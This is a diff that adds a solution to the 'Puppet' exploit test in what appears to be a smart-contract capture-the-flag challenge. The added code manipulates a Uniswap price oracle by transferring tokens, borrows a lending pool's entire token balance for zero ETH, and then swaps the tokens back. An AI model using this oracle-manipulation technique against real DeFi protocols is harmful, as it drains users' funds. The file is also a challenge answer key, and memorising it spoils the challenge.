@@ -93,6 +93,21 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        await this.token.transfer(this.uniswapExchange.address, ether('10'), { from: attacker });
+        await this.lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE, {from: attacker, value: ether('0')});
+
+        await this.token.approve(
+            this.uniswapExchange.address,
+            ether('9999'),
+            { from: attacker }
+        );
+        const deadline = (await web3.eth.getBlock('latest')).timestamp + 300;
+        await this.uniswapExchange.tokenToEthSwapInput(
+            ether('1'),
+            ether('0.1'),
+            deadline,
+            { from: attacker }
+        );
     });
 
     after(async function () {
